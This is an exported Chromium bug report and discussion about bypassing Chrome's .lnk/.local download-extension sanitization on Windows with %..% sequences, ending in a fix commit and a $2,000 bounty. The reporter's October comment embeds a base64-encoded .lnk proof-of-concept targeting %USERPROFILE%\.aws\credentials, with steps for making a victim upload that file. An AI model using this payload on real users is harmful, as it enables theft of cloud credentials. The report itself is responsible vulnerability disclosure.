# Security: Extension sanitization bypass by using %% 

| Field | Value |
|-------|-------|
| **Issue ID** | [40061129](https://issues.chromium.org/issues/40061129) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | UI>Browser>Downloads |
| **Platforms** | Windows |
| **Reporter** | ha...@gmail.com |
| **Assignee** | qi...@chromium.org |
| **Created** | 2022-09-24 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

Due to the fix for <https://bugs.chromium.org/p/chromium/issues/detail?id=1308422>, its possible to bypass link sanitization for dangerous downloads when clicking "Save As" on Windows

**VERSION**  

Chrome Version: [105.0.5195.127 Stable]  

Operating System: [Windows 10 Version 21H2 (Build 19044.2006)]

**REPRODUCTION CASE**

1. See attached file, Right click > Save As for Link 1, see that the dangerous extension .lnk gets replaced with .download.
2. See attached file, Right click > Save As for Link 2, see that the dangerous extension .lnk attempts to get saved. This is because the fix for <https://bugs.chromium.org/p/chromium/issues/detail?id=1308422> is done after the dangerous extension is checked

It can bypass dangerous extension lists (such as saving .scf files, which can result in leak of NTLM hashes according to <https://bugs.chromium.org/p/chromium/issues/detail?id=722524>)

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: Axel Chong

## Attachments

- [poc.html](attachments/poc.html) (text/plain, 92 B)
- [lnk.html](attachments/lnk.html) (text/plain, 353 B)
- [Thu Oct 13 2022 16_54_02.webm](attachments/Thu Oct 13 2022 16_54_02.webm) (video/webm, 1.4 MB)

## Timeline

### [Deleted User] (2022-09-24)

[Empty comment from Monorail migration]

### ha...@gmail.com (2022-09-24)

Forgot to mention that poc.html MUST be hosted on a web server, such as python -m http.server 8000, for this to work!

### ha...@gmail.com (2022-09-24)

[Comment Deleted]

### ha...@gmail.com (2022-09-24)

I can confirm that https://chromium.googlesource.com/chromium/src/+/9cdce354cb3b0da5b4b311638973d407be7712b6 is the offending commit.

Bisect Results:
Earliest major version where the vulnerability occurs - M104 on Stable. Since, the fix was merged in https://bugs.chromium.org/p/chromium/issues/detail?id=1308422 to M104 Stable

From the continuous build archive,
Latest Chrome Developer Build which did not contain the vulnerability - https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win/1014562/ [Version: 105.0.5123.0 (Developer Build) (32-bit)]

Earliest Chrome Developer Build which contains the vulnerability - https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win/1014618/ [Version: 105.0.5123.0 (Developer Build) (32-bit)]

This aligns with https://chromium.googlesource.com/chromium/src/+/9cdce354cb3b0da5b4b311638973d407be7712b6 landing in 105.0.5123.0 according to https://storage.googleapis.com/chromium-find-releases-static/9cd.html#9cdce354cb3b0da5b4b311638973d407be7712b6

### ha...@gmail.com (2022-09-24)

Affected versions at time of reporting - all
Stable 105.0.5195.127
Beta 106.0.5249.55
Dev 107.0.5304.10 

### ha...@gmail.com (2022-09-26)

[Comment Deleted]

### ha...@gmail.com (2022-09-26)

For https://bugs.chromium.org/p/chromium/issues/detail?id=1367632#c0, looks like the extension sanitization is only for .lnk and .local files (not scf). However these files are still dangerous as evidenced by the fact that Chrome blocks this by replacing its extensions with .download (.lnk can point to arbitrary executable / .local can be used by application to determine what dll to load). And by using this vulnerability, it is possible to bypass the blocking.

### aj...@google.com (2022-09-27)

Thanks - agree that we tried to stop people downloading .lnk files - sending to an appropriate queue.

[Monorail components: Services>Safebrowsing UI>Browser>Downloads]

### [Deleted User] (2022-09-27)

[Empty comment from Monorail migration]

### ha...@gmail.com (2022-09-27)

I think the fix here would be to replace % with _ instead of removing %xxx% from a filename.

Ie.
example.ln%%k -> example.ln__k

Alternatively, _ can also be added after removing the %%. 

Ie.
example.ln%data%k -> example.ln_k

### [Deleted User] (2022-09-27)

Setting Pri-2 to match security severity Low. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dr...@chromium.org (2022-09-28)

(Bugs with owners are automatically considered triaged)

### ha...@gmail.com (2022-10-11)

Hi, any updates here? In any case, the fix in https://crbug.com/chromium/1367632#c10 should be easy to implement. Adding a _ after removing %[data-here]% so that a filename such as

example.ln%data%k 

will become:

example.ln_k

### qi...@chromium.org (2022-10-13)

I am wondering whether this qualifies as a security bug. 

Since user sees that the file name in the select file dialog is example.lnk, and he choses to save that, that doesn't feel like a security bug.  The behavior is different from saving a .lnk file without prompting user, as user has no choice to make changes to the file extension. 
Safebrowsing will check the file extension, lnk is regarded as dangerous on windows: https://source.chromium.org/chromium/chromium/src/+/main:components/safe_browsing/content/resources/download_file_types.asciipb;l=2388

### qi...@chromium.org (2022-10-13)

In the previous bug, the windows select file dialog will display "%LOCALDATA%.txt" to user while the actual file saved is "Local.txt", so this is security issue as user cannot see the real file name before confirming the dialog.

However, in this case, the select file dialog already converts the %% env. Since user already see "example.lnk", and choose to confirm it, I don't know if this is a security issue though



### ha...@gmail.com (2022-10-13)

According to the Chrome security FAQ, https://chromium.googlesource.com/chromium/src/+/master/docs/security/faq.md#i-can-cause-a-hard-or-soft-link-to-be-written-to-a-directory-bypassing-normal-os-blocks-is-this-a-security-bug, Chrome should not be able to write .lnk files to a directory with this report https://bugs.chromium.org/p/chromium/issues/detail?id=1140417 (which also shows the filename + extension via showSaveFilePicker in the FileSystemAPI)

Also, users should not be expected to know that lnk can be made into shortcuts to dangerous files and local can influence DLLs an executable loads, so being able to see the file extension doesn't matter.


### qi...@chromium.org (2022-10-13)

When downloading a file, i can rename the file to .lnk successfully in the save as prompt dialog, so I don't think chrome disables writing to .lnk files.

### ha...@gmail.com (2022-10-13)

If you used the PoC above, a normal .lnk file will get renamed to .download. So there is sanitization being performed there. As such chrome does disable writing to .lnk files if the user does not add the .lnk extension by themselves.

### ha...@gmail.com (2022-10-13)

From poc.html, click on (1), you will see instead of example.lnk it becomes example.download, adding %% will bypass this sanitization

### qi...@chromium.org (2022-10-13)

Yes, removing %% will make xxx.ln%xyz%k  into xxx.lnk, but I still don't understand why this is a security issue.

My question is why is "xyz.exe" allowed in select file dialog, but not "xyz.lnk".  Safebrowing should mark both types as unsafe, but I don't understand why we special treat lnk.

### ha...@gmail.com (2022-10-13)

the main code which checks for lnk and local is https://source.chromium.org/chromium/chromium/src/+/main:net/base/filename_util_internal.cc;l=155;drc=796d9f7be35cc8f766fabc6e84df424046460890;bpv=1;bpt=1

you can see that safe browsing does not trigger when it comes to LNK and LOCAL files, because they are already blocked in both direct download and save file dialog. (instead the file extension replace to .download)

The main reason why Chrome reject creating .lnk files - "https://chromium.googlesource.com/chromium/src/+/master/docs/security/faq.md#i-can-cause-a-hard-or-soft-link-to-be-written-to-a-directory-bypassing-normal-os-blocks-is-this-a-security-bug" is because they have unpredictable behaviour, more dangerous than .exe: 
(Please see: https://bugs.chromium.org/p/chromium/issues/detail?id=1152327 for a more detailed example)

For instance, if I upload a LNK file which points to C://Windows/win.ini, it will result in the file C://Windows/win.ini being uploaded instead of LNK file. so you can see I can trick someone to download a LNK file, then upload it, and then I can make them upload any file I want in the system

See the attached PoC and steps:
1. Upload lnk.html to webserver.
2. Execute the following command on the webserver (this is the content of lnk file base64 encoded)

echo "TAAAAAEUAgAAAAAAwAAAAAAAAEabAggAIAAAAJPRMrqDT9YB3kcpey/C1gF9CNSiqlnWAbcCAAAAAAAAAQAAAAAAAAAAAAAAAAAAABYBOgAfREcaA1lyP6dEicVVlf5rMO4mAAEAJgDvvhAAAABHr3NmA0PWAQxArlPwt9YBvX7DhTDC1gEUAHoAdAAaAENGU0YUADEAAAAAAHhRyzgQAEFXU34xAAAAdBpZXpbf00iNZxczvO4ousXN+t+fZ1ZBiUfFx2vAtn86AAkABADvvuFQdkV4Ucs4LgAAAP8WAAAAABUAAAAAAAAAAAAAAAAAAAAgGPIALgBhAHcAcwAAAEAAYAAyALcCAADuUO41IABDUkVERU5+MQAASAAJAAQA777hUHZFeFHbNC4AAAD+qgAAAAAGAAAAAAAAAAAAAAAAAAAAg/fiAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAABgAAABUAAAAHAAAAAEAAAAcAAAANAAAAAAAAABTAAAAGAAAAAMAAAC7D92qEAAAAFdpbmRvd3MAQzpcVXNlcnNcLmF3c1xjcmVkZW50aWFscwAAEwAuAC4AXAAuAGEAdwBzAFwAYwByAGUAZABlAG4AdABpAGEAbABzABIAQwA6AFwAVQBzAGUAcgBzAFwALgBhAHcAcwAUAwAAAQAAoCVVU0VSUFJPRklMRSVcLmF3c1xjcmVkZW50aWFscwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJQBVAFMARQBSAFAAUgBPAEYASQBMAEUAJQBcAC4AYQB3AHMAXABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAFAACg/////zoAAAAcAAAACwAAoHwPzvMBScxKhkjV1EsE7486AAAAYAAAAAMAAKBYAAAAAAAAAHIAAAAAAHRE5jbAikRDv+cVIP9Qz/g10taqdbvqEaapBO0zapzFdETmNsCKREO/5xUg/1DP+DXS1qp1u+oRpqkE7TNqnMXSAAAACQAAoI0AAAAxU1BT4opYRrxMOEO7/BOTJphtznEAAAAEAAAAAB8AAAAwAAAAUwAtADEALQA1AC0AMgAxAC0ANAAwADMAOAAxADYAMgAwADcAMQAtADMAMgA4ADkAMwA4ADUAMgAxADIALQAzADMAOQA3ADIAOQA4ADgANwAyAC0AMgAyADkAMgA5AAAAAAAAADkAAAAxU1BTsRZtRK2NcEinSEAupD14jB0AAABoAAAAAEgAAABxwi74GJU/QLLSmXh12O75AAAAAAAAAAAAAAAA" | base64 --decode > e

3. Save As -> Download the file
4. Upload the file into the input file button, the result is the content at %USERPROFILE%/.aws/credentials uploaded rather than the content of example.lnk.pdf



### ha...@gmail.com (2022-10-13)

[Comment Deleted]

### ha...@gmail.com (2022-10-13)

Note that before Step 1, you must have a file present in %USERPROFILE%\.aws\credentials (I am reusing the PoC in https://bugs.chromium.org/p/chromium/issues/detail?id=1152327)

Also attached a video so that you can see described dangerous behaviour of .lnk


### gi...@appspot.gserviceaccount.com (2022-11-03)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/806c5534cf6ca1e42c9537ea8ab756fb57d71e73

commit 806c5534cf6ca1e42c9537ea8ab756fb57d71e73
Author: Min Qin <qinmin@chromium.org>
Date: Thu Nov 03 20:49:44 2022

Fix an issue download can show insecure file extensions on Windows prompt

This CL Moves RemoveStringBetweenDelimiters() from ui/ to base/ so it
can be shared between ui/ and chrome/, and use the method to sanitize
the file name before prompting Windows dialog.

BUG=1367632

Change-Id: I73d7ccb944435dd17fa67ad3fc3f633616a2b746
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3961716
Reviewed-by: David Trainor <dtrainor@chromium.org>
Commit-Queue: Min Qin <qinmin@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1067215}

[modify] https://crrev.com/806c5534cf6ca1e42c9537ea8ab756fb57d71e73/chrome/browser/download/download_target_determiner_unittest.cc
[modify] https://crrev.com/806c5534cf6ca1e42c9537ea8ab756fb57d71e73/chrome/browser/download/download_target_determiner.cc


### ha...@gmail.com (2022-11-07)

Hi can this be marked as fixed if the CL above fixes the issue.

Thanks!

### qi...@chromium.org (2022-11-07)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-07)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-08)

[Empty comment from Monorail migration]

### am...@google.com (2022-11-17)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-11-18)

Congratulations on another one this week, Axel! The VRP Panel has decided to award you $2,000 for this report. Thank you for your efforts and reporting this issue to us! 

### am...@google.com (2022-11-19)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-01-09)

[Empty comment from Monorail migration]

### am...@google.com (2023-01-10)

[Empty comment from Monorail migration]

### pg...@google.com (2023-01-10)

[Empty comment from Monorail migration]

### [Deleted User] (2023-02-14)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2023-02-14)

This issue was migrated from crbug.com/chromium/1367632?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Services>Safebrowsing, UI>Browser>Downloads]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40061129)*
